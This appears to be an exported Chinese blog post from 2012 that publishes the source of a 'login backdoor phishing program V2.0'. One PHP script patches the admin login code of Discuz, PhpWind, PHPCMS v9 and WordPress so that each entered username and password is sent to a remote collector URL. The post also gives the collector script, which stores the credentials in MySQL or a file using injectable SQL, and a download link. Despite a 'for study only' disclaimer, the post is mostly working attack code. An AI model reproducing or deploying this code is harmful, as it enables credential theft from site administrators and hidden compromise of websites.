class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"preprocessor\">&lt;?php</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/*</span></div><div class=\"line\"> * 用来接收钓鱼程序提交过来的密码，</div><div class=\"line\"> * 本程序目前支持存储文件和数据库两种方式</div><div class=\"line\"> * 后续开发中将支持mail提醒，和第三方接口</div><div class=\"line\"> * QQ消息，其实自己很久没研究了，不知道现在</div><div class=\"line\"> * 的接口还能用不。可以到时候集成进来</div><div class=\"line\"> * 本服务端可独立使用，提交方式</div><div class=\"line\"> * http://localhost/sever.php?uname=用户名&amp;pwd=密码&amp;rsite=站点名字</div><div class=\"line\"> * Author:Return Blogs: www.creturn.com Email: master@creturn.com</div><div class=\"line\"> * 版本：V 2.0</div><div class=\"line\"> *</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"variable\">$saveWay</span> = <span class=\"string\">'mysql'</span>; <span class=\"comment\">//存储方式,mysql:存储数据库中，file:存储文件中,mail,通过邮件发送,qq:通过webQQ协议实现QQ发送消息</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"> * 安全过滤</div><div class=\"line\"> * 根据你自己的需求自行添加</div><div class=\"line\"> * 建议添加上去，防止被注入</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filterSecInfo</span><span class=\"params\">()</span></span>{</div><div class=\"line\"></div><div class=\"line\">}</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"> * 保存为文本形式</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">saveToText</span><span class=\"params\">()</span></span>{</div><div class=\"line\"> <span class=\"variable\">$pwd</span> = <span class=\"string\">'pwd.txt'</span>;</div><div class=\"line\"> <span class=\"variable\">$content</span> = @file_get_contents(<span class=\"variable\">$pwd</span>).&quot;n Uname:&quot;.<span class=\"variable\">$_GET</span>[<span class=\"string\">'uname'</span>].<span class=\"string\">'#Pwd:'</span>.<span class=\"variable\">$_GET</span>[<span class=\"string\">'pwd'</span>].<span class=\"string\">'#site:'</span>.<span class=\"variable\">$_GET</span>[<span class=\"string\">'rsite'</span>];</div><div class=\"line\"> file_put_contents(<span class=\"variable\">$pwd</span>, <span class=\"variable\">$content</span>);</div><div class=\"line\">}</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"> * 保存到数据库</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">saveToDBserver</span><span class=\"params\">()</span></span>{</div><div class=\"line\"></div><div class=\"line\"> filterSecInfo(); <span class=\"comment\">//过滤安全隐患</span></div><div class=\"line\"></div><div class=\"line\"> <span class=\"comment\">//插入数据库中的值</span></div><div class=\"line\"> <span class=\"variable\">$name</span> = @<span class=\"variable\">$_GET</span>[<span class=\"string\">'uname'</span>];</div><div class=\"line\"> <span class=\"variable\">$pword</span> = @<span class=\"variable\">$_GET</span>[<span class=\"string\">'pwd'</span>];</div><div class=\"line\"> <span class=\"variable\">$site</span> = @<span class=\"variable\">$_GET</span>[<span class=\"string\">'rsite'</span>];</div><div class=\"line\"></div><div class=\"line\"> <span class=\"keyword\">empty</span>(<span class=\"variable\">$name</span>) || <span class=\"keyword\">empty</span>(<span class=\"variable\">$pword</span>) ? <span class=\"keyword\">exit</span>(<span class=\"string\">'Not Insert'</span>) : <span class=\"string\">''</span>; <span class=\"comment\">//如果密码或者用户名为空就不用存储了</span></div><div class=\"line\"> <span class=\"variable\">$site</span> = <span class=\"keyword\">empty</span>(<span class=\"variable\">$site</span>) ? <span class=\"string\">'No site info'</span> : <span class=\"variable\">$site</span>;</div><div class=\"line\"></div><div class=\"line\"> <span class=\"comment\">//数据库配置</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"variable\">$dbHost</span> = <span class=\"string\">'localhost'</span>; <span class=\"comment\">//数据库主机地址，默认本地数据库localhost</span></div><div class=\"line\"> <span class=\"variable\">$dbName</span> = <span class=\"string\">'pwd'</span>; <span class=\"comment\">//数据库名</span></div><div class=\"line\"> <span class=\"variable\">$uname</span> = <span class=\"string\">'root'</span>; <span class=\"comment\">//数据库用户名</span></div><div class=\"line\"> <span class=\"variable\">$pwd</span> = <span class=\"string\">''</span>; <span class=\"comment\">//数据库密码</span></div><div class=\"line\"></div><div class=\"line\"> <span class=\"variable\">$con</span> = @mysql_connect(<span class=\"variable\">$dbHost</span>,<span class=\"variable\">$uname</span>,<span class=\"variable\">$pwd</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(<span class=\"string\">'无法连接数据库，请确认数据库信息可用！'</span>);</div><div class=\"line\"> mysql_select_db(<span class=\"variable\">$dbName</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(<span class=\"string\">'没找到此数据库，请创建！'</span>);</div><div class=\"line\"></div><div class=\"line\"> <span class=\"variable\">$sql</span> = &quot;SELECT * FROM `adminlist` WHERE `name` = <span class=\"string\">'$name'</span> <span class=\"keyword\">AND</span> `password` = <span class=\"string\">'$pword'</span> <span class=\"keyword\">AND</span> site = <span class=\"string\">'$site'</span>&quot;;</div><div class=\"line\"> <span class=\"variable\">$result</span> = @mysql_query(<span class=\"variable\">$sql</span>,<span class=\"variable\">$con</span>);</div><div class=\"line\"> <span class=\"variable\">$num_rows</span> = @mysql_num_rows(<span class=\"variable\">$result</span>);</div><div class=\"line\"></div><div class=\"line\"> <span class=\"keyword\">if</span>(<span class=\"keyword\">empty</span>(<span class=\"variable\">$num_rows</span>)){ <span class=\"comment\">//过滤重复数据，插入库中没有的数据</span></div><div class=\"line\"> <span class=\"variable\">$sql</span> = &quot;INSERT INTO adminlist(adminlist.`name`,adminlist.`password`,adminlist.`site`) VALUES (<span class=\"string\">'$name'</span>,<span class=\"string\">'$pword'</span>,<span class=\"string\">'$site'</span>)&quot;;</div><div class=\"line\"> <span class=\"variable\">$result</span> = @mysql_query(<span class=\"variable\">$sql</span>,<span class=\"variable\">$con</span>);</div><div class=\"line\"> <span class=\"variable\">$num_rows</span> = @mysql_num_rows(<span class=\"variable\">$result</span>);</div><div class=\"line\"> <span class=\"keyword\">echo</span> <span class=\"variable\">$num_rows</span>;</div><div class=\"line\"> }<span class=\"keyword\">else</span>{</div><div class=\"line\"> <span class=\"keyword\">echo</span> <span class=\"string\">'库中已有！'</span>;</div><div class=\"line\"> }</div><div class=\"line\"> @mysql_free_result(<span class=\"variable\">$result</span>);</div><div class=\"line\">}</div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"> * 保存到邮箱中，也就是发送数据到指定邮箱</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">saveToEmail</span><span class=\"params\">()</span></span>{</div><div class=\"line\"></div><div class=\"line\">}</div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"> * 邮件通知</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">mailTipMessage</span><span class=\"params\">()</span></span>{</div><div class=\"line\"></div><div class=\"line\">}</div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"> * QQ消息提醒</div><div class=\"line\"> * 通过wap协议QQ发送消息</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">qqTipMessage</span><span class=\"params\">()</span></span>{</div><div class=\"line\"></div><div class=\"line\">}</div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"> * 第三方存储接口</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">otherApi</span><span class=\"params\">()</span></span>{</div><div class=\"line\"></div><div class=\"line\">}</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"> * 存储数据</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">saveData</span><span class=\"params\">()</span></span>{</div><div class=\"line\"> <span class=\"keyword\">global</span> <span class=\"variable\">$saveWay</span>;</div><div class=\"line\"> <span class=\"keyword\">switch</span> (<span class=\"variable\">$saveWay</span>) {</div><div class=\"line\"> <span class=\"keyword\">case</span> <span class=\"string\">'file'</span>:</div><div class=\"line\"> saveToText(); <span class=\"comment\">//保存到文件中</span></div><div class=\"line\"> <span class=\"keyword\">break</span>;</div><div class=\"line\"> <span class=\"keyword\">case</span> <span class=\"string\">'mysql'</span>:</div><div class=\"line\"> saveToDBserver();</div><div class=\"line\"> <span class=\"keyword\">break</span>;</div><div class=\"line\"></div><div class=\"line\"> }</div><div class=\"line\"></div><div class=\"line\">}</div><div class=\"line\">saveData();</div></pre></td></tr></table></figure>\n\n<p>下载地址:<a href=\"http://asset.creturn.com/asset/uploads/2012/07/钓鱼v2.0.zip\" target=\"_blank\" rel=\"external\">钓鱼v2.0</a></p>\n","source":"_posts/登录后门钓鱼程序-v2-0.md","raw":"title: \"登录后门钓鱼程序 V2.0\"\nid: 105\ndate: 2012-07-04 23:59:07\ntags: \n- webshell\n- wordpress漏洞\n- 后门\ncategories: \n- 原创作品\n- 技术文章\n---\n\n此版本中相对1.0版本加入了接收端mysql存储支持。\n\n自动插入后门端加入dz和wordpress的支持\n\n代码：\n\n```php\n<?php\n/**\n +-----------------------------------------------------------------\n * 登录后门钓鱼程序 V2.0\n +-----------------------------------------------------------------\n * 功能介绍：\n * 本程序会根据所选cms和BBS系统自动插入钓鱼后门\n * 后续将完善支持PHP的主流的cms和bbs系统\n * 本程序仅供学习参考，请勿非法用途 ，请保留版权信息\n +-----------------------------------------------------------------\n * 作者： Return Blogs: www.creturn.com email:master@creturn.com\n +-----------------------------------------------------------------\n **/\nerror_reporting(0);\n$rHost = 'http://192.168.1.199/MyProject/server/sever.php'; //定义接收地址\n$pUname = 'uname'; //远程端接收用户名参数\n$pPwd = 'pwd'; //定义远程接收密码参数\n$error = '';\n/**\n * 插入代码\n */\nfunction inSertPwdDoor($cmsCode,$relPath){\n global $rHost,$pUname,$pPwd;\n //读取用户名密码特制\n if($cmsCode['mothed'] == 'post'){\n $rHostPath = $rHost.'?'.$pUname.'=$_POST['.$cmsCode['uname'].']&amp;'.$pPwd.'=$_POST['.$cmsCode['pwd'].']';\n }else{\n $rHostPath = $rHost.'?'.$pUname.'=$_GET['.$cmsCode['uname'].']&amp;'.$pPwd.'=$_GET['.$cmsCode['pwd'].']';\n }\n //获取插入代码\n $keyword = $cmsCode['keyword'];\n $replace = 'file_get_contents(&quot;'.$rHostPath.'&quot;);'.$cmsCode['bedeck'].$keyword;\n $loginPageContent = file_get_contents($relPath);\n $loginPageContent = str_replace($keyword, $replace, $loginPageContent);\n if(file_put_contents($relPath, $loginPageContent)){\n tipAmessage('成功插入！');\n }else{\n tipAmessage('插入失败！');\n }\n}\n\nfunction tipAmessage($msg){\n global $error;\n $error = $msg;\n}\n/**\n * 各类cms登录标识码和文件路径\n *\n * $code说明：\n * $code['keyword'] 关键字，就是要插入代码的特征码\n * $code['bedeck'] 修饰符用来修正代码的外观\n * $code['uname'] 用户名变量名\n * $code['pwd'] 密码变量名\n * $code['mothed'] 密码提交方式：POST 或者 GET\n * $code['path'] 登录文件路径\n * 注意事项：\n * 由于登录口不同程序可能有多个登录方法，正常登录\n * 或者ajax或者第三方登录，所以登录点的关键词必须找准\n */\nfunction switchCms($cmsName){\n $code = array();\n switch ($cmsName) {\n case 'phpcmsV9':\n $code['path'] = 'phpcms/modules/admin/index.php';\n $code['keyword'] = &quot;showmessage(L('login_success'),'?m=admin&amp;c=index');&quot;;\n $code['bedeck'] = &quot;nttt&quot;;\n $code['uname'] = 'username';\n $code['pwd'] = 'password';\n $code['mothed'] = 'post';\n break;\n case 'dedecms':\n break;\n case 'dz':\n $code['path'] = 'source/class/class_admincp.php';\n $code['keyword'] = &quot;$cpgroupid = DB::result_first&quot;;\n $code['bedeck'] = &quot;nttttt&quot;;\n $code['uname'] = 'admin_username';\n $code['pwd'] = 'admin_password';\n $code['mothed'] = 'post';\n break;\n case 'phpwind':\n $code['path'] = 'admin/admincp.php';\n $code['keyword'] = &quot;$REQUEST_URI = trim($REQUEST_URI,'?#');&quot;;\n $code['bedeck'] = &quot;nt&quot;;\n $code['uname'] = 'admin_name';\n $code['pwd'] = 'admin_pwd';\n $code['mothed'] = 'post';\n break;\n case 'wordpress':\n $code['path'] = 'wp-includes/user.php';\n $code['keyword'] = &quot;$user = new WP_User($userdata-&gt;ID);&quot;;\n $code['bedeck'] = &quot;nt&quot;;\n $code['uname'] = 'log';\n $code['pwd'] = 'pwd';\n $code['mothed'] = 'post';\n break;\n default:\n ;\n break;\n }\n return $code;\n\n}\nif(isset($_POST['creack']) &amp;&amp; $_POST['creack'] != ''){\n $webRoot = $_SERVER['DOCUMENT_ROOT']; //当前目录\n $dir = isset($_POST['dir']) &amp;&amp; !empty($_POST['dir']) ? trim($_POST['dir']) : '';\n $cms = isset($_POST['cms']) &amp;&amp; !empty($_POST['cms']) ? trim($_POST['cms']) : '';\n $cmsCode = switchCms($_POST['cms']);\n if(empty($cmsCode)){\n $error = '没找到可用CMS或者BBS';\n }else{\n $relPath = $webRoot.$dir.$cmsCode['path'];\n if(file_exists($relPath)){\n inSertPwdDoor($cmsCode,$relPath);\n }else{\n tipAmessage('没有找到该文件路径：'.$relPath);\n }\n }\n}\n```\n<!--more-->\n```html\n<!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;\n&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;\n&lt;head&gt;\n&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;\n&lt;title&gt;自动插入语句&lt;/title&gt;\n&lt;style type=&quot;text/css&quot;&gt;\n*{\nfont-size:14px;\nline-height:20px;\n}\ndiv{\n width:450px;\n margin: 0px auto;\n}\n?>\n&lt;/style&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n&lt;div style=&quot;width:600px;margin: 0px auto;padding-top: 50px;padding-bottom: 50px; border: 1px #fff012 solid;&quot;&gt;\n&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;\n &lt;div&gt;\n &lt;h2 style=&quot;text-align: center;&quot;&gt;登录后门钓鱼程序 V2.0 &lt;/h2&gt;\n &lt;/div&gt;\n &lt;div&gt;\n &lt;h4 style=&quot;color: red&quot;&gt;注意：Path参数，默认根目录不用填写，如果目标程序在子目录中请填入路径&lt;/h4&gt;\n &lt;/div&gt;\n &lt;div&gt;\n 当前文件路径：&lt;?php echo __FILE__?&gt;&lt;br/&gt;\n &lt;/div&gt;\n &lt;div&gt;\n &lt;input type=&quot;radio&quot; value=&quot;dz&quot; name=&quot;cms&quot; id=&quot;dzcms&quot; /&gt;&lt;label for=&quot;dzcms&quot;&gt;Discuz&lt;/label&gt;\n &lt;input type=&quot;radio&quot; value=&quot;phpwind&quot; name=&quot;cms&quot; id=&quot;phpwind&quot; /&gt;&lt;label for=&quot;phpwind&quot;&gt;PhpWind&lt;/label&gt;\n &lt;input type=&quot;radio&quot; value=&quot;phpcmsV9&quot; name=&quot;cms&quot; id=&quot;v9cms&quot; /&gt;&lt;label for=&quot;v9cms&quot;&gt;PHPCMSv9&lt;/label&gt;\n &lt;input type=&quot;radio&quot; value=&quot;dedecms&quot; name=&quot;cms&quot; id=&quot;dedecms&quot; /&gt;&lt;label for=&quot;dedecms&quot;&gt;DedeCms&lt;/label&gt;\n &lt;input type=&quot;radio&quot; value=&quot;wordpress&quot; name=&quot;cms&quot; id=&quot;wrodpress&quot; /&gt;&lt;label for=&quot;wrodpress&quot;&gt;WordPress&lt;/label&gt;\n &lt;/div&gt;\n\n &lt;div&gt;\n &lt;span&gt;Path:&lt;/span&gt;&lt;/span&gt;&lt;input type=&quot;text&quot; name=&quot;dir&quot; /&gt;\n &lt;input type=&quot;submit&quot; name=&quot;creack&quot; value=&quot;插入后门&quot; /&gt;\n &lt;/div&gt;\n &lt;div style=&quot;text-align: left; color: red; margin-top:20px;&quot;&gt;消息：&lt;?php echo $error;?&gt;&lt;/div&gt;\n&lt;/form&gt;\n&lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n\n```\n\n接收端：\n\n```php\n<?php\n\n/*\n * 用来接收钓鱼程序提交过来的密码，\n * 本程序目前支持存储文件和数据库两种方式\n * 后续开发中将支持mail提醒，和第三方接口\n * QQ消息，其实自己很久没研究了，不知道现在\n * 的接口还能用不。可以到时候集成进来\n * 本服务端可独立使用，提交方式\n * http://localhost/sever.php?uname=用户名&amp;pwd=密码&amp;rsite=站点名字\n * Author:Return Blogs: www.creturn.com Email: master@creturn.com\n * 版本：V 2.0\n *\n */\n$saveWay = 'mysql'; //存储方式,mysql:存储数据库中，file:存储文件中,mail,通过邮件发送,qq:通过webQQ协议实现QQ发送消息\n\n/**\n * 安全过滤\n * 根据你自己的需求自行添加\n * 建议添加上去，防止被注入\n */\nfunction filterSecInfo(){\n\n}\n\n/**\n * 保存为文本形式\n */\nfunction saveToText(){\n $pwd = 'pwd.txt';\n $content = @file_get_contents($pwd).&quot;n Uname:&quot;.$_GET['uname'].'#Pwd:'.$_GET['pwd'].'#site:'.$_GET['rsite'];\n file_put_contents($pwd, $content);\n}\n\n/**\n * 保存到数据库\n */\nfunction saveToDBserver(){\n\n filterSecInfo(); //过滤安全隐患\n\n //插入数据库中的值\n $name = @$_GET['uname'];\n $pword = @$_GET['pwd'];\n $site = @$_GET['rsite'];\n\n empty($name) || empty($pword) ? exit('Not Insert') : ''; //如果密码或者用户名为空就不用存储了\n $site = empty($site) ? 'No site info' : $site;\n\n //数据库配置\n\n$dbHost = 'localhost'; //数据库主机地址，默认本地数据库localhost\n $dbName = 'pwd'; //数据库名\n $uname = 'root'; //数据库用户名\n $pwd = ''; //数据库密码\n\n $con = @mysql_connect($dbHost,$uname,$pwd) or die('无法连接数据库，请确认数据库信息可用！');\n mysql_select_db($dbName) or die('没找到此数据库，请创建！');\n\n $sql = &quot;SELECT * FROM `adminlist` WHERE `name` = '$name' AND `password` = '$pword' AND site = '$site'&quot;;\n $result = @mysql_query($sql,$con);\n $num_rows = @mysql_num_rows($result);\n\n if(empty($num_rows)){ //过滤重复数据，插入库中没有的数据\n $sql = &quot;INSERT INTO adminlist(adminlist.`name`,adminlist.`password`,adminlist.`site`) VALUES ('$name','$pword','$site')&quot;;\n $result = @mysql_query($sql,$con);\n $num_rows = @mysql_num_rows($result);\n echo $num_rows;\n }else{\n echo '库中已有！';\n }\n @mysql_free_result($result);\n}\n/**\n * 保存到邮箱中，也就是发送数据到指定邮箱\n */\nfunction saveToEmail(){\n\n}\n/**\n * 邮件通知\n */\nfunction mailTipMessage(){\n\n}\n/**\n * QQ消息提醒\n * 通过wap协议QQ发送消息\n */\nfunction qqTipMessage(){\n\n}\n/**\n * 第三方存储接口\n */\nfunction otherApi(){\n\n}\n\n/**\n * 存储数据\n */\nfunction saveData(){\n global $saveWay;\n switch ($saveWay) {\n case 'file':\n saveToText(); //保存到文件中\n break;\n case 'mysql':\n saveToDBserver();\n break;\n\n }\n\n}\nsaveData();\n```\n\n下载地址:[钓鱼v2.0](http://asset.creturn.com/asset/uploads/2012/07/钓鱼v2.0.zip)\n","slug":"登录后门钓鱼程序-v2-0","updated":1421659126000,"excerpt":"<p>此版本中相对1.0版本加入了接收端mysql存储支持。</p>\n<p>自动插入后门端加入dz和wordpress的支持</p>\n<p>代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"preprocessor\">&lt;?php</span></div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"> +-----------------------------------------------------------------</div><div class=\"line\"> * 登录后门钓鱼程序 V2.0</div><div class=\"line\"> +-----------------------------------------------------------------</div><div class=\"line\"> * 功能介绍：</div><div class=\"line\"> * 本程序会根据所选cms和BBS系统自动插入钓鱼后门</div><div class=\"line\"> * 后续将完善支持PHP的主流的cms和bbs系统</div><div class=\"line\"> * 本程序仅供学习参考，请勿非法用途 ，请保留版权信息</div><div class=\"line\"> +-----------------------------------------------------------------</div><div class=\"line\"> * 作者： Return Blogs: www.creturn.com email:master@creturn.com</div><div class=\"line\"> +-----------------------------------------------------------------</div><div class=\"line\"> **/</div><div class=\"line\">error_reporting(<span class=\"number\">0</span>);</div><div class=\"line\"><span class=\"variable\">$rHost</span> = <span class=\"string\">'http://192.168.1.199/MyProject/server/sever.php'</span>; <span class=\"comment\">//定义接收地址</span></div><div class=\"line\"><span class=\"variable\">$pUname</span> = <span class=\"string\">'uname'</span>; <span class=\"comment\">//远程端接收用户名参数</span></div><div class=\"line\"><span class=\"variable\">$pPwd</span> = <span class=\"string\">'pwd'</span>; <span class=\"comment\">//定义远程接收密码参数</span></div><div class=\"line\"><span class=\"variable\">$error</span> = <span class=\"string\">''</span>;</div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"> * 插入代码</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">inSertPwdDoor</span><span class=\"params\">(<span class=\"variable\">$cmsCode</span>,<span class=\"variable\">$relPath</span>)</span></span>{</div><div class=\"line\"> <span class=\"keyword\">global</span> <span class=\"variable\">$rHost</span>,<span class=\"variable\">$pUname</span>,<span class=\"variable\">$pPwd</span>;</div><div class=\"line\"> <span class=\"comment\">//读取用户名密码特制</span></div><div class=\"line\"> <span class=\"keyword\">if</span>(<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'mothed'</span>] == <span class=\"string\">'post'</span>){</div><div class=\"line\"> <span class=\"variable\">$rHostPath</span> = <span class=\"variable\">$rHost</span>.<span class=\"string\">'?'</span>.<span class=\"variable\">$pUname</span>.<span class=\"string\">'=$_POST['</span>.<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'uname'</span>].<span class=\"string\">']&amp;'</span>.<span class=\"variable\">$pPwd</span>.<span class=\"string\">'=$_POST['</span>.<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'pwd'</span>].<span class=\"string\">']'</span>;</div><div class=\"line\"> }<span class=\"keyword\">else</span>{</div><div class=\"line\"> <span class=\"variable\">$rHostPath</span> = <span class=\"variable\">$rHost</span>.<span class=\"string\">'?'</span>.<span class=\"variable\">$pUname</span>.<span class=\"string\">'=$_GET['</span>.<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'uname'</span>].<span class=\"string\">']&amp;'</span>.<span class=\"variable\">$pPwd</span>.<span class=\"string\">'=$_GET['</span>.<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'pwd'</span>].<span class=\"string\">']'</span>;</div><div class=\"line\"> }</div><div class=\"line\"> <span class=\"comment\">//获取插入代码</span></div><div class=\"line\"> <span class=\"variable\">$keyword</span> = <span class=\"variable\">$cmsCode</span>[<span class=\"string\">'keyword'</span>];</div><div class=\"line\"> <span class=\"variable\">$replace</span> = <span class=\"string\">'file_get_contents(&quot;'</span>.<span class=\"variable\">$rHostPath</span>.<span class=\"string\">'&quot;);'</span>.<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'bedeck'</span>].<span class=\"variable\">$keyword</span>;</div><div class=\"line\"> <span class=\"variable\">$loginPageContent</span> = file_get_contents(<span class=\"variable\">$relPath</span>);</div><div class=\"line\"> <span class=\"variable\">$loginPageContent</span> = str_replace(<span class=\"variable\">$keyword</span>, <span class=\"variable\">$replace</span>, <span class=\"variable\">$loginPageContent</span>);</div><div class=\"line\"> <span class=\"keyword\">if</span>(file_put_contents(<span class=\"variable\">$relPath</span>, <span class=\"variable\">$loginPageContent</span>)){</div><div class=\"line\"> tipAmessage(<span class=\"string\">'成功插入！'</span>);</div><div class=\"line\"> }<span class=\"keyword\">else</span>{</div><div class=\"line\"> tipAmessage(<span class=\"string\">'插入失败！'</span>);</div><div class=\"line\"> }</div><div class=\"line\">}</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">tipAmessage</span><span class=\"params\">(<span class=\"variable\">$msg</span>)</span></span>{</div><div class=\"line\"> <span class=\"keyword\">global</span> <span class=\"variable\">$error</span>;</div><div class=\"line\"> <span class=\"variable\">$error</span> = <span class=\"variable\">$msg</span>;</div><div class=\"line\">}</div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"> * 各类cms登录标识码和文件路径</div><div class=\"line\"> *</div><div class=\"line\"> * $code说明：</div><div class=\"line\"> * $code['keyword'] 关键字，就是要插入代码的特征码</div><div class=\"line\"> * $code['bedeck'] 修饰符用来修正代码的外观</div><div class=\"line\"> * $code['uname'] 用户名变量名</div><div class=\"line\"> * $code['pwd'] 密码变量名</div><div class=\"line\"> * $code['mothed'] 密码提交方式：POST 或者 GET</div><div class=\"line\"> * $code['path'] 登录文件路径</div><div class=\"line\"> * 注意事项：</div><div class=\"line\"> * 由于登录口不同程序可能有多个登录方法，正常登录</div><div class=\"line\"> * 或者ajax或者第三方登录，所以登录点的关键词必须找准</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">switchCms</span><span class=\"params\">(<span class=\"variable\">$cmsName</span>)</span></span>{</div><div class=\"line\"> <span class=\"variable\">$code</span> = <span class=\"keyword\">array</span>();</div><div class=\"line\"> <span class=\"keyword\">switch</span> (<span class=\"variable\">$cmsName</span>) {</div><div class=\"line\"> <span class=\"keyword\">case</span> <span class=\"string\">'phpcmsV9'</span>:</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'path'</span>] = <span class=\"string\">'phpcms/modules/admin/index.php'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'keyword'</span>] = &quot;showmessage(L(<span class=\"string\">'login_success'</span>),<span class=\"string\">'?m=admin&amp;c=index'</span>);&quot;;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'bedeck'</span>] = &quot;nttt&quot;;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'uname'</span>] = <span class=\"string\">'username'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'pwd'</span>] = <span class=\"string\">'password'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span 